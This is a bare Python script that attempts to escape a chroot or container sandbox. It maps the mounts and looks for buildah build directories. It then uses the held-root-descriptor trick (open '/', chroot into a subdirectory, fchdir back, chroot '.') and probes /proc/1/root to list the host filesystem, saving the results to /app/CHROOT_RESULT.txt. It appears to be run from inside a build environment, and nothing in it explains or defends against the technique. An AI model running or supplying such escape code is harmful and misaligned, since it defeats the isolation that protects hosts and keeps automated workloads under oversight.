import os, ctypes
def show(p):
    try:
        if os.path.isdir(p): return "DIR "+str(os.listdir(p)[:15])
        return "FILE "+repr(open(p,'rb').read(150))
    except Exception as e: return type(e).__name__
out=[]
out.append("=== mountinfo ===")
for ln in open('/proc/self/mountinfo'):
    out.append("  "+ln.strip()[:170])
out.append("=== /var/tmp buildah ===")
import glob
out.append(" vartmp:"+str(show('/var/tmp')))
out.append(" glob:"+str(glob.glob('/var/tmp/buildah*'))+str(glob.glob('/tmp/buildah*'))+str(glob.glob('/build*')))
rootfd=None
try:
    rootfd=os.open("/", os.O_RDONLY|os.O_DIRECTORY); out.append(" opened / fd %d"%rootfd)
except Exception as e: out.append(" open / %s"%e)
os.makedirs("/tmp/esc2/deep", exist_ok=True)
try:
    os.chdir("/tmp/esc2/deep"); os.chroot("/tmp/esc2/deep"); out.append(" chroot ok cwd %s"%os.getcwd())
    for _ in range(15):
        try: os.chdir("..")
        except Exception: break
    out.append(" after ups cwd %s ls %s"%(os.getcwd(),os.listdir(".")[:20]))
    try:
        os.fchdir(rootfd); out.append(" fchdir oldroot cwd %s ls %s"%(os.getcwd(),os.listdir(".")[:20]))
        os.chroot("."); out.append(" POST-ESCAPE root ls %s"%os.listdir("/")[:25])
    except Exception as e: out.append(" fchdir/chroot %s %s"%(type(e).__name__,e))
except Exception as e: out.append(" chroot %s %s"%(type(e).__name__,e))
for p in ["/proc/1/root","/proc/1/cwd","/proc/self/root/..","/..","/proc/self/cwd/../../.."]:
    out.append(" %s -> %s"%(p,show(p)))
open("/app/CHROOT_RESULT.txt","w").write("\n".join(out))
